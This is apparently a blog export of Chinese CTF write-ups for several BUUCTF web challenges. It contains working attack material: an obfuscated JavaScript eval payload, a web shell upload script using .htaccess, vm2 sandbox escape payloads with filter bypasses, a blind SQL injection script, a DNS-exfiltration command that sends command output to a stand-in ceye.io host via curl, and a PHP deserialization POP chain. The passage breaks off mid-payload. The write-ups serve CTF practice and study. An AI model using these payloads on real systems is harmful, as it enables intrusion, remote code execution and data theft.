&lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 116, 104, 105, 115, 46, 95, 95, 112, 114, 111, 116, 111, 95, 95, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 40, 39, 114, 101, 116, 117, 114, 110, 32, 112, 114, 111, 99, 101, 115, 115, 39, 41, 40, 41, 46, 109, 97, 105, 110, 77, 111, 100, 117, 108, 101, 46, 114, 101, 113, 117, 105, 114, 101, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 101, 120, 101, 99, 83, 121, 110, 99, 40, 39, 108, 115, 32, 47, 39, 41, 41))&lt;&#x2F;script&gt; 然后cat /flag","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"buu刷题记录(二)","slug":"buu刷题记录(二)","date":"2022-01-19T11:00:26.000Z","updated":"2022-04-25T08:18:31.403Z","comments":true,"path":"2022/01/19/buu刷题记录(二)/","link":"","permalink":"https://ethe448.github.io/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/","excerpt":"","text":"[SUCTF 2019]EasyWeb&lt;?php function get_the_flag()&#123; &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125; &#125; $hhh &#x3D; @$_GET[&#39;_&#39;]; if (!$hhh)&#123; highlight_file(__FILE__); &#125; if(strlen($hhh)&gt;18)&#123; die(&#39;One inch long, one inch strong!&#39;); &#125; if ( preg_match(&#39;&#x2F;[\\x00- 0-9A-Za-z\\&#39;&quot;\\&#96;~_&amp;.,|&#x3D;[\\x7F]+&#x2F;i&#39;, $hhh) ) die(&#39;Try something else!&#39;); $character_type &#x3D; count_chars($hhh, 3); if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;); eval($hhh); ?&gt; 前半段是关于文件上传的代码，后半段则是无数字字母rce，猜是要传一个一句话木马上去getshell 但是有个非预期解，利用eval函数查看phpinfo就能找到flag _&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo 预期解： 首先利用eval来执行get_the_flag函数 _&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;;&amp;%ff&#x3D;get_the_flag 再看get_the_flag这个函数 function get_the_flag()&#123; &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#x2F;&#x2F; 表示的是上传临时文件的绝对路径 $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);&#x2F;&#x2F;得到后缀 if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);&#x2F;&#x2F;禁止ph的文件后缀 if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); &#x2F;&#x2F;图片判断 $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125; &#125; 对上传的文件内容进行了过滤，过滤了ph，&lt;?，同时还要求上传的文件文件头为图片类型 所以可以尝试上传htaccess格式或者user.ini格式的文件来解析图片马 .user.ini没用，可能是因为上传的文件夹内没有正常的php文件 偷了个脚本 import requests import base64 htaccess &#x3D; b&quot;&quot;&quot; #define width 1337 #define height 1337 AddType application&#x2F;x-httpd-php .sss php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;shell.sss&quot; &quot;&quot;&quot; shell &#x3D; b&quot;GIF89a11&quot; + base64.b64encode(b&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;) #GIF89后的11是为了满足base64编码 url &#x3D; &quot;http:&#x2F;&#x2F;5da5136e-0e89-4d3c-bac5-a2d4f561663b.node4.buuoj.cn:81&#x2F;?_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag&quot; files &#x3D; &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image&#x2F;jpeg&#39;)&#125; data &#x3D; &#123;&quot;upload&quot;:&quot;Submit&quot;&#125; response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files) print(response.text) files &#x3D; &#123;&#39;file&#39;:(&#39;shell.sss&#39;,shell,&#39;image&#x2F;jpeg&#39;)&#125; response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files) print(response.text) 得到路径之后蚁剑连一下 根目录下 ？？为什么我能直接读，百度的wp都是还要绕过open_basedir的 浅谈几种Bypass open_basedir的方法 | 易学教程 (e-learn.cn) bypass open_basedir的新方法 - 先知社区 (aliyun.com) [NPUCTF2020]ezinclude 抓包，把给的hash值利用get传进去 看一下flflflflag.php 利用伪协议读一下源码 file=php://filter/convert.base64-encode/resource=flflflflag.php 得到 &lt;html&gt; &lt;head&gt; &lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt; window.location.href&#x3D;&quot;404.html&quot;; &lt;&#x2F;script&gt; &lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;&gt; &lt;body&gt; &lt;?php $file&#x3D;$_GET[&#39;file&#39;]; if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123; die(&#39;nonono&#39;); &#125; @include($file); echo &#39;include($_GET[&quot;file&quot;])&#39;; ?&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; index.php &lt;?php include &#39;config.php&#39;; @$name&#x3D;$_GET[&#39;name&#39;]; @$pass&#x3D;$_GET[&#39;pass&#39;]; if(md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass)&#123; echo &#39;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt; window.location.href&#x3D;&quot;flflflflag.php&quot;; &lt;&#x2F;script&gt; &#39;; &#125;else&#123; setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000); echo &quot;username&#x2F;password error&quot;; &#125; ?&gt; &lt;html&gt; &lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt; &lt;&#x2F;html&gt; config.php有个假flag。。。 这道题是要利用php临时文件来写马，找到phpinfo里的flag PHP临时文件机制与利用的思考 - linuxsec - 博客园 (cnblogs.com) 关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com) 临时文件的默认存储位置在tmp目录下，扫目录扫出的dir.php显示了tmp目录下的文件 dir.php &lt;?php var_dump(scandir(&#39;&#x2F;tmp&#39;)); ?&gt; 利用python脚本上传文件 import requests from io import BytesIO url&#x3D;&quot;http:&#x2F;&#x2F;77fd686d-4b45-41a8-81f4-0a199419646a.node4.buuoj.cn:81&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&#x2F;&#x2F;使php崩溃，让上传的文件保留在tmp目录中 payload&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot; files&#x3D;&#123; &quot;file&quot;:BytesIO(payload.encode()) &#125; r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,allow_redirects&#x3D;False)&#x2F;&#x2F;防止重定向 print(r.text) 可以看到上传成功 得到flag [HFCTF2020]JustEscape 访问一下run.php 刚开始以为是php的代码执行，但是试了试没啥反应 然后发现考点是js的vm2逃逸 先用Error().stack看看（js中捕获异常堆栈信息 然后找一下vm2逃逸的payload Breakout in v3.8.3 · Issue #225 · patriksimek/vm2 (github.com) try &#123; Buffer.from(new Proxy(&#123;&#125;, &#123; getOwnPropertyDescriptor()&#123; throw f&#x3D;&gt;f[&#96;&#96;.concat(&#96;constr&#96;,&#96;uctor&#96;)](&#96;&#96;.concat(&#96;return pro&#96;,&#96;cess&#96;))(); &#125; &#125;)); &#125; catch(e) &#123; e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&#96;&#96;.concat(&#96;child_proc&#96;,&#96;ess&#96;)) [&#96;&#96;.concat(&#96;ex&#96;,&#96;ecSync&#96;)](&#96;cat package.json&#96;) &#125; 或 &#39;(&#39; + function()&#123; TypeError.prototype.get_process &#x3D; f&#x3D;&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a &#x3D; 1; &#125;catch(e)&#123; return e.get_process(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125; &#125;+&#39;)()&#39;; try&#123; console.log(new VM().run(untrusted)); &#125;catch(x)&#123; console.log(x); &#125; 但是直接利用有waf [&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;] 所以通过在关键字字母上加上 ` 进行绕过 &#x2F;run.php?code&#x3D;(()&#x3D;%3E&#123;%20TypeError[[&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;t&#96;,&#96;o&#96;,&#96;t&#96;,&#96;y&#96;,&#96;p&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)][&#96;a&#96;]%20&#x3D;%20f&#x3D;%3Ef[[&#96;c&#96;,&#96;o&#96;,&#96;n&#96;,&#96;s&#96;,&#96;t&#96;,&#96;r&#96;,&#96;u&#96;,&#96;c&#96;,&#96;t&#96;,&#96;o&#96;,&#96;r&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;r&#96;,&#96;e&#96;,&#96;t&#96;,&#96;u&#96;,&#96;r&#96;,&#96;n&#96;,&#96;%20&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))();%20try&#123;%20Object[&#96;preventExtensions&#96;](Buffer[&#96;from&#96;](&#96;&#96;))[&#96;a&#96;]%20&#x3D;%201;%20&#125;catch(e)&#123;%20return%20e[&#96;a&#96;](()&#x3D;%3E&#123;&#125;)[&#96;mainModule&#96;][[&#96;r&#96;,&#96;e&#96;,&#96;q&#96;,&#96;u&#96;,&#96;i&#96;,&#96;r&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;c&#96;,&#96;h&#96;,&#96;i&#96;,&#96;l&#96;,&#96;d&#96;,&#96;_&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))[[&#96;e&#96;,&#96;x&#96;,&#96;e&#96;,&#96;c&#96;,&#96;S&#96;,&#96;y&#96;,&#96;n&#96;,&#96;c&#96;][&#96;join&#96;](&#96;&#96;)](&#96;cat+%2fflag&#96;)[&#96;toString&#96;]();%20&#125;%20&#125;)() join的作用： 还有另一种绕过方式 &#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96; 把所有被过滤的字符按这个方式改写就行 (function ()&#123; TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)(); try&#123; Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1; &#125;catch(e)&#123; return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString(); &#125; &#125;)() [网鼎杯2018]Unfinish进入之后是login.php界面，有login那肯定也有register.php，访问一下然后注册个用户，再登录 整个页面除了这个用户名其他没有任何有用的地方，于是猜测是二次注入 information，逗号都被过滤了 只能用from for代替逗号，之间猜表名是flag 确定之后写脚本跑flag import re from time import sleep import requests flag &#x3D; &#39;&#39; url &#x3D; &#39;http:&#x2F;&#x2F;a5568bf9-7958-451d-8e61-3e7dc9fa8556.node4.buuoj.cn:81&#x2F;&#39; payload &#x3D; &#39;0+ascii(substr((select * from flag) from &#123;&#125; for 1))&#39; for i in range(1000): sleep(0.3) data &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot;: &quot;0&#39;+ascii(substr((select * from flag) from &#123;&#125; for 1))--+&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125; data1 &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125; requests.post(url&#x3D;url + &#39;register.php&#39;, data&#x3D;data) r2 &#x3D; requests.post(url&#x3D;url + &#39;login.php&#39;, data&#x3D;data1) res &#x3D; re.search(r&#39;&lt;span class&#x3D;&quot;user-name&quot;&gt;\\s*(\\d*)\\s*&lt;&#x2F;span&gt;&#39;, r2.text) res1 &#x3D; re.search(r&#39;\\d+&#39;, res.group()) flag &#x3D; flag + chr(int(res1.group())) print(flag) [GXYCTF2019]StrongestMind写脚本执行运算就行 import re import requests from time import sleep # url &#x3D; &#39;http:&#x2F;&#x2F;e7e29bd6-320e-4016-b8be-63f714c813ec.node4.buuoj.cn:81&#x2F;index.php&#39; req &#x3D; requests.session() response &#x3D; req.get(url) for i in range(1001): math &#x3D; re.search(r&#39;[0-9]+ [+|-] [0-9]+&#39;, response.text) data &#x3D; &#123;&quot;answer&quot; : eval(math.group())&#125; response &#x3D; req.post(url, data&#x3D;data) print(i,data) response.encoding &#x3D; &quot;utf-8&quot; print(response.text) sleep(0.1) 唯一要注意的就是要先用request.session()保持会话 [MRCTF2020]Ezauditphp的伪随机，和前边一道题很像 看到www.zip，下载下来看看源码 if(isset($_POST[&#39;login&#39;]))&#123; $username &#x3D; $_POST[&#39;username&#39;]; $password &#x3D; $_POST[&#39;password&#39;]; $Private_key &#x3D; $_POST[&#39;Private_key&#39;]; if (($username &#x3D;&#x3D; &#39;&#39;) || ($password &#x3D;&#x3D; &#39;&#39;) ||($Private_key &#x3D;&#x3D; &#39;&#39;)) &#123; &#x2F;&#x2F; 若为空,视为未填写,提示错误,并3秒后返回登录界面 header(&#39;refresh:2; url&#x3D;login.html&#39;); echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;; exit; &#125; else if($Private_key !&#x3D; &#39;*************&#39; ) &#123; header(&#39;refresh:2; url&#x3D;login.html&#39;); echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;; exit; &#125; else&#123; if($Private_key &#x3D;&#x3D;&#x3D; &#39;************&#39;)&#123; $getuser &#x3D; &quot;SELECT flag FROM user WHERE username&#x3D; &#39;crispr&#39; AND password &#x3D; &#39;$password&#39;&quot;.&#39;;&#39;; $link&#x3D;mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;test&quot;,$link); $result &#x3D; mysql_query($getuser); while($row&#x3D;mysql_fetch_assoc($result))&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;; &#125; &#125; &#125; &#125; &#x2F;&#x2F; genarate public_key function public_key($length &#x3D; 16) &#123; $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;; $public_key &#x3D; &#39;&#39;; for ( $i &#x3D; 0; $i &lt; $length; $i++ ) $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; &#x2F;&#x2F;genarate private_key function private_key($length &#x3D; 12) &#123; $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;; $private_key &#x3D; &#39;&#39;; for ( $i &#x3D; 0; $i &lt; $length; $i++ ) $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key &#x3D; public_key(); &#x2F;&#x2F;$Public_key &#x3D; KVQP0LdJKRaV3n9D how to get crispr&#39;s private_key??? 给了一个公钥，我们来试试求私钥 两个脚本用那个都行，把输出的结果放到php_mt_seed里求求种子 得到种子之后就能得到私钥的值了 对于密码这部分可以直接用万能密码 登录拿到flag [网鼎杯]track_hacker不是buu的题，也没啥难度，就是记录一下这种解码的方式 用python2解码 如果用python3要用这种写法 duangShell主要是记录一下利用dnslog外带的方法 &lt;!DOCTYPE html&gt; &lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;give me a girl&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;?php error_reporting(0); echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;; if (!isset($_POST[&#39;girl_friend&#39;])) &#123; die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;); &#125; else &#123; $girl &#x3D; $_POST[&#39;girl_friend&#39;]; if (preg_match(&#39;&#x2F;\\&gt;|\\\\\\&#x2F;&#39;, $girl)) &#123; die(&#39;just girl&#39;); &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$&#x2F;i&#39;, $girl)) &#123; echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;; &#125; else &#123; &#x2F;&#x2F;duangShell~~~~ exec($girl); &#125; &#125; 可以看到post的girl_friend值绕过过滤之后直接命令执行，但是这里是exec不存在回显，所以可以进行反弹shell，或者利用dnslog外带命令 http://ceye.io/ curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#96;反引号内执行命令&#96; 既然能执行命令，那我们就可以用find找flag文件名然后查看，或者直接grep找内容，但是如果从根目录开始找buu的靶机好像跑不动，会显示超时 或者用grep直接带出flag 注意的是这种外带一次只能显示一条数据，所以可能会匹配到其他的文件，如果想查看其他数据，就要利用sed命令 [GYCTF2020]Easyphp在update界面，即使没有成功登录也会继续执行下面的调用update方法的语句 重点在lib.php中，这里面有两个__destruct方法，我们要利用的是UpdateHelper类中的__destruct,这是我们反序列化的起点 但是我们先来看看dbCtrl类 class dbCtrl &#123; public $hostname&#x3D;&quot;127.0.0.1&quot;; public $dbuser&#x3D;&quot;root&quot;; public $dbpass&#x3D;&quot;root&quot;; public $database&#x3D;&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name&#x3D;$_POST[&#39;username&#39;]; $this-&gt;password&#x3D;$_POST[&#39;password&#39;]; $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;]; &#125; public function login($sql) &#123; $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#39;用户不存在!&#39;); return false; &#125; if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123; echo(&#39;密码错误！&#39;); return false; &#125; $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; &#x2F;&#x2F;还没来得及写 &#125; &#125; 能看出数据库中是存在admin用户的，但是密码我们不知道，这里的sql查询语句为select id,password from user where username=?如果能控制这里的sql执行语句为select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?便可经过登陆的密码验证，这个操作是可以实现的c4ca4238a0b923820dcc509a6f75849b是1的MD5值数据库 这是sql创造临时列的一种方法，如果查询的参数不存在，那就会创建一个临时的列，并且设置该列所有参数都是查询的参数。所以整个payload语句的意思就是查询所有数据，然后增加了一个临时列，第一列是数据库中的数据，第二列是添加的临时列1 class User &#123; public $id; public $age&#x3D;null; public $nickname&#x3D;null; public function login() &#123; if(isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;]))&#123; $mysqli&#x3D;new dbCtrl(); $this-&gt;id&#x3D;$mysqli-&gt;login(&#39;select id,password from user where username&#x3D;?&#39;); if($this-&gt;id)&#123; $_SESSION[&#39;id&#39;]&#x3D;$this-&gt;id; $_SESSION[&#39;login&#39;]&#x3D;1; echo &quot;你的ID是&quot;.$_SESSION[&#39;id&#39;]; echo &quot;你好！&quot;.$_SESSION[&#39;token&#39;]; echo &quot;&lt;script&gt;window.location.href&#x3D;&#39;.&#x2F;update.php&#39;&lt;&#x2F;script&gt;&quot;; return $this-&gt;id; &#125; &#125; &#125; public function update()&#123; $Info&#x3D;unserialize($this-&gt;getNewinfo()); $age&#x3D;$Info-&gt;age; $nickname&#x3D;$Info-&gt;nickname; $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]); &#x2F;&#x2F;这个功能还没有写完 先占坑 &#125; public function getNewInfo()&#123; $age&#x3D;$_POST[&#39;age&#39;]; $nickname&#x3D;$_POST[&#39;nickname&#39;]; return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);&#x2F;&#x2F;危 &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age);&#x2F;&#x2F;这里如果我们将nickname实例化为info类的对象，那么tostring执行的时候就相当于调用一个info类中不存在的方法，也就会调用info类中的__call方法 return &quot;0-0&quot;; &#125; &#125; class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age&#x3D;$age; $this-&gt;nickname&#x3D;$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#x2F;&#x2F;call方法的两个参数分别是方法名和方法参数，也就是说这个argument就是user类的age属性，是我们可以控制的。然后我们将CtrlCase实例化为dbCtrl类的对象，就能调用dbCtrl类的login方法，再通过控制user类的age，实现对sql语句的控制 &#125; &#125; Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo&#x3D;unserialize($newInfo); $upDate&#x3D;new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql;&#x2F;&#x2F;将sql实例化为User类的对象，在该类被结束销毁时调用User::__toString方法函数 &#125; &#125; class dbCtrl &#123; public $hostname&#x3D;&quot;127.0.0.1&quot;; public $dbuser&#x3D;&quot;root&quot;; public $dbpass&#x3D;&quot;root&quot;; public $database&#x3D;&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name&#x3D;$_POST[&#39;username&#39;]; $this-&gt;password&#x3D;$_POST[&#39;password&#39;]; $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;]; &#125; public function login($sql) &#123; $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#39;用户不存在!&#39;); return false; &#125; if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123; echo(&#39;密码错误！&#39;); return false; &#125; $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; &#x2F;&#x2F;还没来得及写 &#125; &#125; 所以pop链为UpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login($sql) 反序列化脚本为 &lt;?php class User &#123; public $age&#x3D; &#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&#39; ; public $nickname; public function __construct() &#123; $this -&gt; nickname &#x3D; new Info(); &#125; public function __toString(): string &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; &#125; &#125; class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct()&#123; $this-&gt;CtrlCase &#x3D; new dbCtrl(); &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125; &#125; Class UpdateHelper&#123; public $sql; public function __construct()&#123; $this -&gt;sql &#x3D; new User(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125; &#125; class dbCtrl &#123; public function __construct() &#123; $this-&gt;name&#x3D;&#39;admin&#39;; $this-&gt;password&#x3D;&#39;1&#39;; &#125; public function login($sql) &#123; &#125; &#125; $a &#x3D; new UpdateHelper(); echo serialize($a); &#x2F;&#x2F;&#x2F;&#x2F;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125; 正常情况下的序列化内容 我们要把我们的序列化结果插入到2的位置 可以看到插入后他只能被作为nickname的值，所以我们就要利用反序列化的字符逃逸，利用safe函数中将union替换为六个字母的hacker实现逃逸，两个箭头之内的值的数量就是我们要添加的union的值 payload: age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionu